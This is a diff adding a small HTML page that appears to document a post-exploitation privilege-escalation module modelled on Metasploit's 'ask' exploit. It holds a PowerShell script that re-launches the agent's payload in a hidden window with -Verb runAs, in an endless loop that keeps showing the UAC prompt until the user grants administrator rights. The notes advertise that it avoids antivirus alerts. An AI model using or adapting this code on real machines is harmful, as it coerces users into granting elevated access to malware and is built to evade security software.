@@ -1,0 +1,31 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Ask</title>
+</head><body>Leverages Start-Process' -Verb runAs option inside a" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; " YES-Required loop to prompt the user for a high integrity context before running the agent code."<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; " UAC will report Powershell is requesting Administrator privileges."<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp; &nbsp;" Because this does not use the BypassUAC DLLs, it should not trigger any AV alerts."</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Does not need Admin<br/>
+https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ask.rb<br/>
+<br/>
+script = '''<br/>
+if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1) {<br/>
+&nbsp; &nbsp; while($True) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; try {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Start-Process "powershell" -ArgumentList "%s" -Verb runAs -WindowStyle hidden<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "[*] Successfully elevated!"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; catch {}<br/>
+&nbsp; &nbsp; }<br/>
+}<br/>
+else &nbsp;{<br/>
+&nbsp; &nbsp; "[!] User is not a local administrator!"<br/>
+}<br/>
+'''</body></html>
